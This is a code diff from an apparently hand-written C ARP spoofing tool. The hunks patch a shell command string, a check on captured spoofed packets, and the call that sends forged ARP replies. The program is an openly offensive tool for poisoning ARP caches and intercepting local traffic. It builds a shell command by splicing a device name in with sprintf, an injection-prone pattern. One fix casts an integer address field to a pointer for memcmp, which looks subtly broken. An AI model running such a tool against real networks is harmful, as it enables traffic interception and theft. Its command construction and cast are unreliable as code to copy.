@@ -122,7 +122,7 @@ int getMyNetworkInfo(uint8_t* res, uint32_t* ip) {
 	char buf[20];
 	char cmd[128]; 
 	char *cmd1 = "arp -n | grep ether | awk '{print $3}' && ifconfig ";
-	char *cmd2 = " | grep ether | awk '{print $2}' && ifconfig";
+	char *cmd2 = " | grep ether | awk '{print $2}' && ifconfig ";
 	char *cmd3 = " | grep netmask | awk '{print $2}';";
 
 	sprintf(cmd, "%s%s%s%s%s",cmd1, dev, cmd2, dev, cmd3);
@@ -160,8 +160,8 @@ void* _func(u_char* packet, int packet_size) {
 		if (res == 0) continue;
 		recv_eth_hdr = (struct eth_header*) spoofed_packet;
 		if (ntohs(recv_eth_hdr->type) == ETHERTYPE_IP) {
-			struct iphdr* ip_hdr = (struct iphdr* ip_hdr) (spoofed_packet+14);
-			if (!memcmp(recv_eth_hdr->dest_mac, my_mac, 6) && !memcmp(ip_hdr->saddr, my_ip, 4)) {
+			struct iphdr* ip_hdr = (struct iphdr*) (spoofed_packet+14);
+			if (!memcmp(recv_eth_hdr->dest_mac, my_mac, 6) && !memcmp((const void*)ip_hdr->saddr, (const void*)my_ip, 4)) {
 				printf("Spoofed Packet=======================================\n");
 				printf("Src MAC: ");
 				for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->src_mac[i]);
@@ -281,7 +281,7 @@ int main(int argc, char* argv[]) {
 					memcpy(packet+14, arp_hdr, arp_sz);
 					printf("=====================================================\n");
 
-					if (pcap_sendpacket(handle, copied, packet_size) == -1) {
+					if (pcap_sendpacket(handle, packet, _sz) == -1) {
 						printf("ARP Spoofing Failed..\n");
 					} else {
 						printf("ARP Spoofing Success!!!\n");
